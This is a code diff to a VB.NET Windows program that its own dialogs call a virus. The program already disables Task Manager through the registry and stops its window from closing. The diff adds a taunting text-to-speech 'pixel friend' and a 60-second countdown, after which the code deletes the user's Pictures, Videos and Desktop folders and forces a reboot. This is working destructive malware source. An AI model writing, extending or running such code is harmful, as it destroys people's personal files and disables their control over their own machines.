@@ -4,6 +4,8 @@ Imports Microsoft.Win32
 Public Class Form1
     Dim words As String() = {"IDIOT", "NOOB", "FAILURE", "NOOOOOOB", "LOLLLL", "LOL", "EEERRRROOOOORRR", "IDIOT ALERT", "NEVER", "GONNA", "GIVE", "YOU", "UP"}
     Dim haha As Bitmap
+    Dim tts = CreateObject("SAPI.spvoice")
+    Dim time As Integer = 60
 
     <DllImport("user32.dll")>
     Private Shared Function GetWindowDC(ByVal hWnd As IntPtr) As IntPtr
@@ -79,11 +81,12 @@ Public Class Form1
     End Sub
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        MessageBoxManager.Register()
         Dim answer = MsgBox("This virus contains flashing lights (: do you still want to continue???", MsgBoxStyle.YesNo)
         If answer = MsgBoxResult.Yes Then
             Dim answer2 = MsgBox("I AM NOT REPONSIBLE FOR ANY DAMAGE! CONTINUE?", MsgBoxStyle.YesNo)
             If answer2 = MsgBoxResult.Yes Then
-                IO.File.WriteAllText("C:\lmaoeedeed4654.bit", "Your computer is bricked now, whatever you do, do NOT restart. :D")
+                IO.File.WriteAllText("C:\lmaoeedeed4654.bit", "Your computer is bricked now, whatever you do, do NOT restart. :D" + vbNewLine + vbNewLine + "It takes a while for the final payload to activate, so be patient.")
                 Me.TopMost = True
                 Dim systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                 systemRegistry.SetValue("DisableTaskMgr", 1)
@@ -223,6 +226,7 @@ Public Class Form1
         haha = Take()
         Timer11.Start()
         Me.WindowState = FormWindowState.Maximized
+        Timer14.Start()
         Timer12.Stop()
     End Sub
 
@@ -238,5 +242,52 @@ Public Class Form1
 
     Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
         e.Cancel = True
+    End Sub
+
+    Private Sub Timer14_Tick(sender As Object, e As EventArgs) Handles Timer14.Tick
+        Timer1.Stop()
+        Timer2.Stop()
+        Timer3.Stop()
+        Timer4.Stop()
+        Timer5.Stop()
+        Timer6.Stop()
+        Timer7.Stop()
+        Timer8.Stop()
+        Timer9.Stop()
+        Timer10.Stop()
+        Timer11.Stop()
+        Timer12.Stop()
+        Timer13.Stop()
+        Timer16.Stop()
+        Me.BackColor = Color.Black
+        Me.BackgroundImage = Nothing
+        My.Computer.Audio.Stop()
+        Pf.Show()
+        tts.speak("Hello, It is me pixel friend. But this time I am here to destroy your computer! Let me inject a virus into your computer.")
+        tts.speak("Oh, this already is a virus! I am, not, sorry to hear that.")
+        tts.speak("I will also kill your computer soon. so enjoy it as long as you can. dot. dot. dot.")
+        Timer15.Start()
+        tts.speak("You have 60 seconds left until i activate the final pay load.")
+        Timer14.Stop()
+    End Sub
+
+    Private Sub Timer15_Tick(sender As Object, e As EventArgs) Handles Timer15.Tick
+        time -= 10
+        If time = 0 Then
+            tts.speak("Your personal files will now be cleaned up. Also known as deleted")
+            IO.Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
+            IO.Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos))
+            IO.Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory))
+            tts.speak("It is now done, have a great time.")
+            Process.Start("shutdown", "-r -t 00")
+            Timer15.Stop()
+        Else
+            tts.speak("You have " & time & " seconds left until i activate the final pay load.")
+        End If
+
+    End Sub
+
+    Private Sub Timer16_Tick(sender As Object, e As EventArgs) Handles Timer16.Tick
+
     End Sub
 End Class
